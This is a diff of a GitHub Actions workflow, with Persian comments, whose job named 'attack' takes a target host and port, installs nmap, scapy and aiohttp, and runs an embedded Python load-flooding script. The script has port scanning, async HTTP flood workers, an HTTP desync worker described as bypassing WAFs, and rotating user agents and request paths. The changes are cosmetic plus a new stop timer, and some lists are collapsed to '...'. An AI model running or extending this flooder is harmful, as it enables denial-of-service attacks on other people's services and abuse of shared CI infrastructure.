@@ -43,23 +43,23 @@ jobs:
   attack:
     runs-on: ubuntu-latest
     steps:
-      - name: دریافت مخزن
+      - name: 📥 دریافت مخزن
         uses: actions/checkout@v4
         with:
           fetch-depth: 0
 
-      - name: تنظیمات Git
+      - name: ⚙️ تنظیمات Git
         run: |
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
 
-      - name: نصب ابزارها
+      - name: 🔧 نصب ابزارها
         run: |
           sudo apt-get update
           sudo apt-get install -y nmap
           pip3 install aiohttp rich "httpx[http2]" websockets scapy python-nmap
 
-      - name: اجرای حمله
+      - name: 🚀 اجرای حمله
         env:
           TARGET_HOST: ${{ github.event.inputs.target }}
           TARGET_PORT: ${{ github.event.inputs.port }}
@@ -84,6 +84,7 @@ jobs:
 
           stop_event = threading.Event()
 
+          # ===== توابع کش، آمار و شبکه (بدون تغییر) =====
           def load_cache():
               if not CACHE_FILE.exists(): return {}
               try:
@@ -172,52 +173,13 @@ jobs:
                   console.print("[yellow]⚠️ رفتن به Nmap...[/yellow]")
               return deep_scan_ports(ip)
 
-          USER_AGENTS = [
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:119.0) Gecko/20100101 Firefox/119.0",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
-              "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
-              "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
-              "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/105.0.0.0",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
-              "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-              "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-              "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
-              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:78.0) Gecko/20100101 Firefox/78.0",
-              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
-              "Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
-          ]
+          USER_AGENTS = [ "Mozilla/5.0 ... Chrome/120.0.0.0", ... ] # همان لیست
           def get_random_ua(): return random.choice(USER_AGENTS)
 
-          RANDOM_PATHS = [
-              "/", "/index.html", "/home", "/about", "/contact", "/api/v1/status", "/api/v2/users",
-              "/login", "/signup", "/search", "/products", "/categories", "/blog", "/news",
-              "/images/logo.png", "/css/style.css", "/js/app.js", "/favicon.ico", "/robots.txt",
-              "/sitemap.xml", "/feed", "/wp-admin/", "/wp-content/", "/.env", "/config",
-              "/api/v1/auth", "/api/v2/data", "/graphql", "/oauth/token", "/status",
-              "/health", "/ping", "/version", "/metrics", "/stats", "/analytics",
-          ]
+          RANDOM_PATHS = [ "/", "/index.html", ... ]
           def get_random_path(): return random.choice(RANDOM_PATHS)
 
-          # ===== کارگرهای فوق‌سریع (بدون sleep) =====
+          # ===== کارگرهای حمله (همان‌ها، بدون تغییر) =====
           async def http_worker(url, worker_id):
               connector = aiohttp.TCPConnector(limit=0, force_close=False)
               async with aiohttp.ClientSession(connector=connector) as session:
@@ -250,7 +212,6 @@ jobs:
                       except:
                           increment('sent'); increment('failed')
 
-          # HTTP Desync (تکنیک پیشرفته دور زدن WAF)
           async def desync_worker(url, worker_id):
               parsed = url.replace('https://', '').replace('http://', '').split('/')[0]
               host = parsed.split(':')[0]
@@ -487,14 +448,10 @@ jobs:
                       t.daemon = True; t.start()
 
           stats['start_time'] = time.time()
-          with Live(stats_display(), refresh_per_second=2, console=console) as live:
-              end_time = time.time() + DURATION
-              while time.time() < end_time:
-                  time.sleep(0.5)
-                  live.update(stats_display())
-
+          # ===== تایمر دقیق برای توقف =====
+          time.sleep(DURATION)
           stop_event.set()
-          time.sleep(0.5)
+          time.sleep(2)  # فرصت برای خروج نخ‌ها
 
           final = get_stats()
           console.print("\n[bold green]✅ حمله کاملاً متوقف شد.[/bold green]")
@@ -530,3 +487,5 @@ jobs:
           summary.add_row("زمان کل", f"{final['elapsed']:.1f}s")
           console.print(summary)
           PYEOF
+
+          # ===== دیگه sleep 21600 نداریم =====
